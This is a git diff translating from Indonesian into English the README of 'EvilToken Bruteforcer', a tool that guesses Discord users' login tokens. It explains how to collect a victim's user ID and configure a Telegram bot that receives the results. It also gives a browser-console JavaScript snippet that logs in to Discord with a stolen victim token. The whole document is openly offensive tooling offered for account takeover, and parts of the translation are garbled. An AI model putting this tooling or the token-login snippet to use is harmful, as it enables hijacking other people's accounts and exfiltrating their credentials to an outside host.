@@ -1,13 +1,12 @@
 # EvilToken Bruteforcer.
-Script ini digunakan untuk membruteforce atau menebak - nebak token access login untuk user Discord.
-Gw cuma improve code, gw terima kasih ke @NAOYY karena sudah publikasikan source code. Cross Platform, sudah diuji coba via sistem Macintosh OS dan Microsoft Windows. Kurang tau kalo di Termux bisa ato kagak.
+This script is used to bruteforce or guess the login access token for Discord users. I'm just improving the code, thanks to @NAOYY for publishing the source code. Cross Platform, has been tested via Macintosh OS and Microsoft Windows systems. I don't know if it works on Termux or not.
 
 ## Screenshots Program.
 ![Screenshot MacOS](https://i.ibb.co/zxSLDDP/photo-2021-02-03-12-36-19.jpg)
 ![Screenshot Windows](https://i.ibb.co/rpzQztd/Entod-Token-SS.jpg)
 ## Installation
 
-Dibutuhkan Python versi 3, dan tentunya [pip](https://pip.pypa.io/en/stable/) untuk install module.
+Python version 3 is required, and of course [pip](https://pip.pypa.io/en/stable/) to install the module.
 
 ```python
 pip install signal
@@ -15,45 +14,45 @@ pip install discord
 pip install colorama
 ```
 
-## Cara Penggunaan
+## How to use
 
-Cukup mudah, tinggal diedit saja source code ke info pribadi kalian sesuka saja. Paling tinggal di edit Bot Token sama User ID masing masing saja.
+It's quite easy, just edit the source code to your personal info as you like. The only thing left to do is edit the Bot Token and their respective User IDs.
 
 ```python
-# Mengirim pesan ke Bot Telegram.
+# Send messages to Telegram Bot.
 def sendteleg(botmsg):
    bot_token = 'BotTokenLo'
    bot_chatID = 'UserIDLo'
 ```
 
-Pastikan juga sudah mengubah setting Discord ke Developer Mode untuk mendapatkan User ID Discord Victim. Caranya tinggal ke Settings > Appearance > Developer Mode. Kalo semisal sudah di aktifkan, tinggal diklik kanan victimnya dan dipaling bawah ada tulisan "Copy ID". Masukkan saja ke Dalam Program.
+Also make sure to change the Discord setting to Developer Mode to get the Victim Discord User ID. The trick is to go to Settings > Appearance > Developer Mode. If it's been activated, just right-click on the victim and at the bottom it says "Copy ID". Just put it in the program.
 
 ![bro](https://i.ibb.co/tz4zYTg/image.png)
 
-Sukses bruteforcingnya? Tinggal login pakai token yang sukses dibruteforce saja. Cara untuk login via token juga sebenernya lumayan gampang cara loginnya. Tinggal butuh knowledge dikit dikit tentang Browser.
+The bruteforcing success? Just login using the token that was successfully bruteforced. The way to login via token is actually quite easy to log in. Just need a little knowledge about the browser.
 
-1. Buka Incognito Mode di Google Chrome.
-2. Pergi ke https://discord.com/app.
-3. Buka Developer Tools dan pergi ke Console.
-4. Copy Paste Kode Berikut.
+1. Open Incognito Mode in Google Chrome
+2. Go to https://discord.com/app
+3. Open Developer Tools and go to Console
+4. Copy Paste the following code
 
 ```js
 (function() {
-    window.t = "GANTI INI JADI TOKEN VICTIM"
+    window.t = "CHANGE THIS TO A VICTIM TOKEN"
     window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;
     window.setInterval(() => window.localStorage.token = `"${window.t}"`);
     window.location.reload();
 })();
 ```
 
-5. Enter dan boom, logged in.
+5. Enter and boom, logged in.
 
 ## Contributing
-Bebas dah mau lu apain, tapi asalkan lu gak jual belikan nih program sama ngaku ngaku ni buatan lo. Awas aja dah kalo sampe ketahuan, asu emang skidder bangke. Kalo semisal ada saran, bisa contact ke gw : @FallenV4 via Telegram.
+It's free what you want to do, but as long as you don't buy and sell, this program is the same as claiming to be made by you. Just be careful if you get caught, asu is really a skidder. If you have suggestions, please contact me: @FallenV4 via Telegram.
 
-Please donate ke gw, gw gak ada penghasilan buat program ginian asu.
+Please donate to me, I don't have any income for this.
 
 [PayPal](https://paypal.me/akmalpv4) |
 [Saweria](https://saweria.co/fallenv4) | [YouTube](https://www.youtube.com/channel/UCPlVO-tSnP8TCMDKLx49Rwg) | [Group Telegram](https://t.me/fallenkuy)
-## Kenapa gw buat ini?
-Ada alasan tertentu, pastinya :).
+## Why did you do this?
+There's a reason, for sure :).
